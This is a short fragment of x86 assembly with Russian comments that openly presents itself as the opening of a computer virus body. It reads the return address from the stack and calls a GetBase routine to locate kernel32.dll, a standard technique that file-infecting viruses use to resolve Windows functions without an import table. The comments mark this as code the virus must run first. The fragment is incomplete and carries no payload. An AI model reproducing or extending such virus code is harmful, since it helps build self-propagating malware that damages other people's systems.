start:;начало тела вируса

        ; команды ниже должны исполнятся вирусом в персую очередь
        ; иначе стек забьется и мы уже не найдем базу kernel.dll

        mov esi,[esp]
        call GetBase ;после вызова в eax - база kernel32.dll

        ; и потом сохранить?? его куда-нибудь из eax для дальнейшего использования